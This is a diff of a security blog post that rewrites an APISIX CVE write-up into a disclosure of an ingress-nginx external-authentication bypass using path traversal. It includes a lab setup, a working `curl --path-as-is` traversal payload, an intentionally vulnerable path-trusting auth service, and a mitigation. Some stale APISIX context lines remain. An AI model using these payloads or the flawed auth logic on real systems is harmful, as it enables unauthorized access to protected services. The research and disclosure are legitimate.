@@ -7,141 +7,148 @@ tags: [kubernetes, ingress, nginx, path-traversal]
 
 {{< figure src="[https://user-images.githubusercontent.com/17719543/139592951-0fafc921-437e-4bb7-b0ee-199dd72b36c3.png](https://user-images.githubusercontent.com/17719543/170878532-514c01cc-aa97-42b2-adba-f61a155d9863.png)" class="image-center" >}}
 
-In October 2021 I have researched [ingress-nginx](https://kubernetes.github.io/ingress-nginx/) for possibility to bypass external authentication using path traversal. It was origin story for other investigations regarding insecure usage of `$request_uri` which leaded to [Apache APISIX CVE-2021-43557](https://apisix.apache.org/blog/2021/11/23/cve-2021-43557-research-report/). I have started with report on HackerOne to Kubernetes project: https://hackerone.com/reports/1357948. It took long time for the team to investigate it, but in the end I got some bounty 😏 but report was closed as informative. They asked me to create normal [issue](https://github.com/kubernetes/ingress-nginx/issues/8644) in github as this behavior is considered as **not security issue**. For me this is still an issue of **insecure design**. Root cause of it, is how nginx is handling `$request_uri` variable. 
+In October 2021 I was researched [ingress-nginx](https://kubernetes.github.io/ingress-nginx/) for possibility to bypass external authentication using path traversal. It was origin story for other investigations regarding insecure usage of `$request_uri` which leaded to [Apache APISIX CVE-2021-43557](https://apisix.apache.org/blog/2021/11/23/cve-2021-43557-research-report/). I have started with report on HackerOne to Kubernetes project: https://hackerone.com/reports/1357948. It took long time for the team to investigate it, but in the end I got some bounty 😏 sadly report was closed as informative. They asked me to create normal [issue](https://github.com/kubernetes/ingress-nginx/issues/8644) in github as this behavior is considered as **not security issue**. For me this is still an issue of **insecure design**.
 
-research on insecure usage of `$request_uri` variable in [Apache APISIX](https://github.com/apache/apisix-ingress-controller/) ingress controller. My work end up in submit of security vulnerability, which was positively confirmed and got CVE-2021-43557. At the end of article I will mention in short [Skipper](https://github.com/zalando/skipper) which I tested for same problem.
+Just look on values of `X-Original-Url` and `X-Auth-Request-Redirect` that are send to external auth service:
+```
+X-Request-Id: 7d979c82ca55141ed0d58655fbaac586
+Host: auth-service.default.svc.cluster.local
+X-Original-Url: http://app.test/public-service/..%2Fprotected-service/protected
+X-Original-Method: GET
+X-Sent-From: nginx-ingress-controller
+X-Real-Ip: 192.168.99.1
+X-Forwarded-For: 192.168.99.1
+X-Auth-Request-Redirect: /public-service/..%2Fprotected-service/protected
+Connection: close
+User-Agent: curl/7.75.0
+Accept: */*
+```
 
-What is APISIX ? From official website:
+Root cause of the problem, is how nginx is handling `$request_uri` variable. It's documented very "frugal":
 
-> Apache APISIX is a dynamic, real-time, high-performance API gateway.
-> APISIX provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more.
+{{< figure src="[https://user-images.githubusercontent.com/17719543/139592951-0fafc921-437e-4bb7-b0ee-199dd72b36c3.png]([https://user-images.githubusercontent.com/17719543/170878532-514c01cc-aa97-42b2-adba-f61a155d9863.png](https://user-images.githubusercontent.com/17719543/170879498-1cca915f-9c5f-45f3-a6fc-fdfc97ff22a2.png))" class="image-center" >}}
 
-Why `$request_uri` ? This [variable](https://nginx.org/en/docs/http/ngx_http_core_module.html#var_request_uri) is many times used in authentication and authorization plugins. It's **not normalized**, so giving a possibility to bypass some restrictions. 
+For me it's not enought. There should be brought documentation of risks associated with consuming not normalized paths. After pointing it out to nginx team, I got response that it's obvious that `$request_uri` is not normalized and developers should take care of their projects 😕. This would be perfect world, but we are not living in such. Just compare it with documentation in [envoy](https://www.envoyproxy.io):
 
-In Apache APISIX there is no typical functionality of external authentication/authorization. You can write your own plugin, but it's quite complicated. To prove that APISIX is vulnerable to path-traversal I will use `uri-blocker` plugin. I'm suspecting that other plugins are also vulnerable but this one is easy to use.
+* [rejecting-client-requests-with-escaped-slashes](https://www.getambassador.io/docs/edge-stack/latest/topics/running/ambassador/#rejecting-client-requests-with-escaped-slashes) - although it's not directly for Emissary. It's describing well envoy concerts for escaped slashes
+* [GHSA-xcx5-93pw-jw2w](https://github.com/envoyproxy/envoy/security/advisories/GHSA-xcx5-93pw-jw2w) (CVE-2019–9901) - description of risks associated with normalizing paths in envoy
+* [envoy http connection manager options](https://www.envoyproxy.io/docs/envoy/latest/api-v3/extensions/filters/network/http_connection_manager/v3/http_connection_manager.proto) - look for two particular: `normalize_path` and `path_with_escaped_slashes_action`
+
+**If you also thinks similar. Put your comment in https://github.com/kubernetes/ingress-nginx/issues/8644**
 
 ## Setting the stage
 
-Install APISIX into Kubernetes. Use helm chart with version **0.7.2**:
+### install ingress-nginx into Kubernetes:
 
 ```bash
-helm repo add apisix https://charts.apiseven.com
-helm repo add bitnami https://charts.bitnami.com/bitnami
-helm repo update
-kubectl create ns ingress-apisix
-helm install apisix apisix/apisix \
-  --set gateway.type=NodePort \
-  --set ingress-controller.enabled=true \
-  --namespace ingress-apisix \
-  --version 0.7.2
-kubectl get service --namespace ingress-apisix
+helm upgrade --install ingress-nginx ingress-nginx \
+  --repo https://kubernetes.github.io/ingress-nginx \
+  --namespace ingress-nginx --create-namespace
 ```
 
-In case of problems follow [official guide](https://github.com/apache/apisix-ingress-controller/blob/master/docs/en/latest/deployments/minikube.md).
+In case of problems follow [official guide](https://kubernetes.github.io/ingress-nginx/deploy/).
 
-To create *ingress route*, you need to deploy `ApisixRoute` resource:
+### deploy test application
 
-```yaml
-apiVersion: apisix.apache.org/v2beta1
-kind: ApisixRoute
-metadata:
-  name: public-service-route
-spec:
-  http:
-  - name: public-service-rule
-    match:
-      hosts:
-      - app.test
-      paths:
-      - /public-service/*
-    backends:
-        - serviceName: public-service
-          servicePort: 8080
-    plugins:
-      - name: proxy-rewrite
-        enable: true
-        config:
-          regex_uri: ["/public-service/(.*)", "/$1"]
-  - name: protected-service-rule
-    match:
-      hosts:
-      - app.test
-      paths:
-      - /protected-service/*
-    backends:
-        - serviceName: protected-service
-          servicePort: 8080
-    plugins:
-      - name: uri-blocker
-        enable: true
-        config:
-          block_rules: ["^/protected-service(/?).*"]
-          case_insensitive: true
-      - name: proxy-rewrite
-        enable: true
-        config:
-          regex_uri: ["/protected-service/(.*)", "/$1"]
+```
+kubectl apply -f https://raw.githubusercontent.com/xvnpw/k8s-ingress-auth-bypass/master/app.yaml
 ```
 
-Let's dive deep into it:
+### [optional] forward ingress port
 
-- it creates routes for `public-service` and `private-service`
-- there is `proxy-rewrite` turned on to remove prefixes
-- there is `uri-blocker` plugin configured for `protected-service`. It can look like mistake but this plugin it about to block any requests starting with `/protected-service` 😀
-
-## Exploitation
-
-I'm using APISIX in version **2.10.0**.
-
-Reaching out to APISIX routes in minikube is quite inconvenient: `kubectl exec -it -n ${namespace of Apache APISIX} ${Pod name of Apache APISIX} -- curl --path-as-is http://127.0.0.1:9080/public-service/public -H 'Host: app.test'`. To ease my pain I will write small script that will work as template:
-
-```bash
-#/bin/bash
-
-kubectl exec -it -n ingress-apisix apisix-dc9d99d76-vl5lh -- curl --path-as-is http://127.0.0.1:9080$1 -H 'Host: app.test'
+```
+kubectl port-forward service/ingress-nginx-controller -n ingress-nginx 8080:80
 ```
 
-In your case replace `apisix-dc9d99d76-vl5lh` with name of actual APISIX pod.
+### verify services
 
-Let's start with validation if routes and plugins are working as expected:
+First public service. It should be available without authentication:
 
-```bash
-$ ./apisix_request.sh "/public-service/public"
-Defaulted container "apisix" out of: apisix, wait-etcd (init)
+```
+$ curl http://127.0.0.1:8080/public-service/public -H "Host: app.test"
 {"data":"public data"}
 ```
 
-```bash
-$ ./apisix_request.sh "/protected-service/protected"
-Defaulted container "apisix" out of: apisix, wait-etcd (init)
+and now protected:
+
+```
+$ curl http://127.0.0.1:8080/protected-service/protected  -H "Host: app.test"
 <html>
-<head><title>403 Forbidden</title></head>
+<head><title>401 Authorization Required</title></head>
 <body>
-<center><h1>403 Forbidden</h1></center>
-<hr><center>openresty</center>
+<center><h1>401 Authorization Required</h1></center>
+<hr><center>nginx</center>
 </body>
 </html>
-```
 
-Yep. `public-service` is available and `protected-service` is blocked by plugin.
-
-Now let's test payloads:
-
-```bash
-$ ./apisix_request.sh "/public-service/../protected-service/protected"
-Defaulted container "apisix" out of: apisix, wait-etcd (init)
+$ curl http://127.0.0.1:8080/protected-service/protected -H "X-Api-Key: secret-api-key" -H "Host: app.test"
 {"data":"protected data"}
 ```
 
-and second one:
+as you can see I needed to provide "secret-api-key" to get resource.
 
-```bash
-$ ./apisix_request.sh "/public-service/..%2Fprotected-service/protected"
-Defaulted container "apisix" out of: apisix, wait-etcd (init)
+## Exploitation
+
+Let's send request with path traversal
+
+```
+$ curl --path-as-is http://127.0.0.1:8080/public-service/../protected-service/protected  -H "Host: app.test"
 {"data":"protected data"}
 ```
 
-As you can see in both cases I was able to bypass uri restrictions 😄
+As you can see, I was able to bypass uri restrictions 😄
+
+## Authentication service
+
+Of course **not all** authentication services will be vulnerable. Only those that are making specific decisional based on requested paths. In my case service looks like this:
+
+```
+@app.route('/verify')
+def verify():
+    print(request.headers, file=sys.stderr)
+    api_key = request.headers.get('X-Api-Key')
+    request_redirect = request.headers.get('X-Auth-Request-Redirect')
+
+    if request_redirect and request_redirect.startswith("/public-service/"):
+        return Response(status = HTTPStatus.NO_CONTENT)
+
+    if api_key == "secret-api-key":  
+        return Response(status = HTTPStatus.NO_CONTENT)
+
+    return Response(status = HTTPStatus.UNAUTHORIZED)
+```
+
+and ingress is defined as:
+
+```
+apiVersion: networking.k8s.io/v1
+kind: Ingress
+metadata:
+  name: my-ingress
+  annotations:
+    kubernetes.io/ingress.class: "nginx"
+    nginx.ingress.kubernetes.io/rewrite-target: /$1
+    nginx.ingress.kubernetes.io/auth-url: http://auth-service.default.svc.cluster.local:8080/verify
+spec:
+  rules:
+    - host: app.test
+      http:
+        paths:
+          - path: /public-service/(.*)
+            pathType: Prefix
+            backend:
+              service:
+                name: public-service
+                port:
+                  number: 8080
+          - path: /protected-service/(.*)
+            pathType: Prefix
+            backend:
+              service:
+                name: protected-service
+                port:
+                  number: 8080
+```
 
 ### Root cause
 
@@ -158,31 +165,32 @@ Search for usage of `var.request_uri` gave me a hint that maybe [authz-keycloak 
 
 ### Mitigation
 
-In case of custom plugins, I suggest to do path normalization before using `ngx.var.request_uri` variable. There are also two other variables, high probably normalized, to check `ctx.var.upstream_uri` and `ctx.var.uri`.
+One thing is to not trust content of `X-Original-Uri` and `X-Auth-Request-Redirect` headers. But there is also nice variable that can be used: `$service_name`
 
-## Skipper
-
-Skipper is another ingress controller that I have investigated. It's not easy to install it in kubernetes, because deployment guide and helm charts are outdated. Luckily I have found issue page where developer was describing how to install it. This ingress gives possibility to implement external authentication based on [webhook filter](https://opensource.zalando.com/skipper/reference/filters/#webhook):
-
-```yaml
+```
 apiVersion: networking.k8s.io/v1
 kind: Ingress
 metadata:
   name: my-ingress
   annotations:
-    zalando.org/skipper-filter: |
-      modPath("^/.*/", "/") -> setRequestHeader("X-Auth-Request-Redirect", "${request.path}") -> webhook("http://auth-service.default.svc.cluster.local:8080/verify")
+    nginx.ingress.kubernetes.io/rewrite-target: /$1
+    nginx.ingress.kubernetes.io/auth-url: http://auth-service.default.svc.cluster.local:8080/verify
+    nginx.ingress.kubernetes.io/configuration-snippet: |
+      more_set_input_headers "X-Forwarded-Scheme: $scheme";
+      more_set_input_headers "X-Forwarded-Uri: $uri";
+      more_set_input_headers "X-Forwarded-Prefix: $service_name";
+      more_set_input_headers "X-Forwarded-Host: $http_host";
 ```
 
-To add some interesting headers that could help in access control decision, you need to do it manually with `setRequestHeader` filter. There is template available to inject variable by `${}`. Sadly (for attackers) `${request.path}` is having normalized path 😐 I see in code that developers are not using *easily* `RequestURI` or `originalRequest`. 
-
-I wasn't able to exploit path traversal in this case. Skipper remains safe.
+it allows to get name of service in kubernetes that is targeted by request and pass it to auth-url. This way it's not manipulated!
 
 ## Summary
 
-Apache APISIX is vulnerable for path traversal. It's not affecting any external authentication, but plugins that are using `ctx.var.request_uri` variable. 
+I'm really happy that I have asked myself what is `X-Auth-Request-Redirect` header 🙂 This question took me for nice adventure, where I have checked source code of several ingress controllers. 
 
-Whole code of this example is here https://github.com/xvnpw/k8s-CVE-2021-43557-poc.
+What is sad is how nginx is considering `$request_uri` and how hard is to convince both nginx and ingress-nginx team that this is real security problem.
+
+Whole code of this example is here https://github.com/xvnpw/k8s-ingress-auth-bypass.
 
 ### Other articles from this series
 
